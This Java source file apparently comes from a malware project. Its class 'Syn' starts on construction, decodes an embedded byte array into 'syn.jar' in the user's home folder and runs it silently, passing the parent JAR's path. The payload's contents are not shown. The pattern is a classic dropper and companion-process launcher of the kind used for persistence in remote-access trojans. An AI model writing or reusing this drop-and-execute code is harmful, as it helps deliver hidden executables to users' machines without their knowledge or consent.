import java.io.IOException;
import java.io.File;
import java.io.FileOutputStream;

class Syn extends Thread {

	public Syn() {
		this.start();
	}

	public void run() {
		try {
			this.build();
			this.syn();
		} catch(IOException ioe) {
			Debug.print("Failed to start syn!\n");
		}
	}

	public void build() throws IOException {
		byte[] buffer = new byte[SynCode.SYN_CODE.length];
		for(int i = 0; i < SynCode.SYN_CODE.length; i++) {
			buffer[i] = Byte.valueOf("" + SynCode.SYN_CODE[i]);
		}
		String file = System.getProperty("user.home") + "\\syn.jar";
		FileOutputStream out = new FileOutputStream(new File(file));
		out.write(buffer, 0, buffer.length);
		out.close();
	}

	public void syn() throws IOException {
		String[] cmd = new String[4];
		cmd[0] = "java";
		cmd[1] = "-jar";
		cmd[2] = System.getProperty("user.home") + "\\syn.jar";
		cmd[3] = Util.getJARLoc();
		Runtime.getRuntime().exec(cmd);
	}

}